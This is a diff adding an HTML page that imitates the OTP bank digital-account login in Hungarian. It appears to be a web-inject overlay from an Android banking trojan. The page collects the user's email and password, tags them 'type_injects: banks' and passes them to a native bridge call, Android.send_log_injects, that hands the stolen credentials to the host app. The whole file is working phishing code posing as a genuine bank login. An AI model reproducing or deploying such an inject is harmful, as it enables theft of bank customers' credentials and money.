@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        body {
+            background-color: #f5f6f7;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            padding: 15px;
+        }
+
+        section {
+            padding: 15px;
+            flex: 1;
+            width: 280px;
+            margin: 0 auto;
+        }
+
+        footer {
+            padding: 15px;
+        }
+
+        input,button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .cool-input {
+            box-sizing: border-box;
+            border: 0;
+            width: 100%;
+            position: relative;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        .cool-input__input {
+            box-sizing: border-box;
+            background: none;
+            width: 100%;
+            padding: 10px;
+            padding-left: 0;
+            position: relative;
+            z-index: 2;
+            font-size: 1em;
+        }
+        .cool-input__input:focus {
+            outline: none;
+        }
+
+        .cool-input__placeholder {
+            box-sizing: border-box;
+            border: none;
+            background: none;
+            width: 100%;
+            position: absolute;
+            z-index: 1;
+            left:0;
+            top: 50%;
+            line-height: 0;
+            color: #999999;
+            transition: all 0.2s ease;
+        }
+
+        .cool-input__input_filled + .cool-input__placeholder,
+        .cool-input__input:focus + .cool-input__placeholder {
+            font-size: 0.8em;
+            top: 0;
+            margin-top: 0em;
+        }
+        
+        .cool-input__input:focus + .cool-input__placeholder {
+            color: #000;
+        }
+
+        .input {
+            width: 100%;
+            border: 0;
+            border-bottom: 1px solid #979797;
+        }
+
+        .input:focus {
+            border-bottom: 2px solid #000;
+        }
+
+        .button {
+            width: 100%;
+            padding: 8px;
+            border: 0;
+            border-radius: 25px;
+            background-color: #77b650;
+            color: #fff;
+            margin-bottom: 20px;
+        }
+
+        .button:disabled {
+            background-color: #e3e3e3;
+            color: #a4a4a4;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <span style="padding: 10px 12px;box-shadow: 0px 11px 30px -4px rgba(0, 0, 0, 0.259);border-radius: 75px;">
+                <img style="width: 14px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAvCAMAAABexYMQAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6Mjc4QTYxREY5NzA2MTFFQkE0RjlBRjlENEVCMTgyQ0EiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6Mjc4QTYxRTA5NzA2MTFFQkE0RjlBRjlENEVCMTgyQ0EiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoyNzhBNjFERDk3MDYxMUVCQTRGOUFGOUQ0RUIxODJDQSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoyNzhBNjFERTk3MDYxMUVCQTRGOUFGOUQ0RUIxODJDQSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PiUloSMAAAAzUExURVKuMFSvMnK8WHnAYILDao/IepHKfZLKfqHRkafTmbjbrMnjws7lyNLnzuHs4Ovx7PX296a/tRcAAAC9SURBVDjLpdXbEoIwDATQIIoggv7/1wrDpU2ymwxjn89DL5utfPMlf5l3P2fm1cg9MQuRLjYruX1Cowg2mkBjCDKWAOOIN544A4g1iBgDiTaYKENIbRipDCXFcHKagBwmIrsJyWbmkGxmEpFHNjtPKQmne+4idJw9QucdBqi8BUfVm1JUZ4MhlTGCdFYxMpmHyM4OQm4GAfKz7BHoBIdQt1gEO8og3HUakc5UiHXvioaswxfUpn/B0I4X/pQfG6pbtbY+kLcAAAAASUVORK5CYII=" alt="">
+            </span>            
+            <p style="font-size: 16px;font-weight: bold;text-align: center;margin-top: 35px;margin-bottom: 0;"> Jelentkezz be az OTP Digitális Fiókodba </p>
+        </header>
+        <section>
+            <div class="cool-input">
+                <input type="text" id="login" name="login" onkeyup="check();" class="input cool-input__input" autocomplete="off">
+                <span class="cool-input__placeholder"> E-mail cím </span>
+            </div>
+            <div class="cool-input">
+                <input type="password" id="password" name="password" onkeyup="check();" class="input cool-input__input" autocomplete="off">
+                <span class="cool-input__placeholder"> Jelszó </span>
+            </div>
+        </section>
+        <footer>
+            <input type="submit" class="button" id="sendData" disabled value="Tovább">
+        
+            <p style="text-align: center;font-size: 14px;color: #437d22;font-weight: 600;"> Elfelejtettem a jelszavamat </p>
+            <p style="text-align: center;font-size: 14px;color: #437d22;font-weight: 600;"> Még nincs OTP Digitális Fiókom </p>
+        </footer>
+    </form>
+    <script>
+        $('.cool-input__input').on('input', function(){
+            var $this = $(this);
+            if ($this.val() == '') {
+                $this.removeClass('cool-input__input_filled');
+            } else {
+                $this.addClass('cool-input__input_filled');
+            }
+        });
+
+        var login = document.getElementById('login'),
+            password = document.getElementById('password');
+
+        var sendData = document.getElementById('sendData');
+
+        function check() {
+            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length >= 6) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        login.onkeyup = () => {
+            check();
+        }
+
+        password.onkeyup = () => {
+            check();
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+            data.email = login.value;
+            data.password = password.value;
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+    </script>
+</body>
+</html>
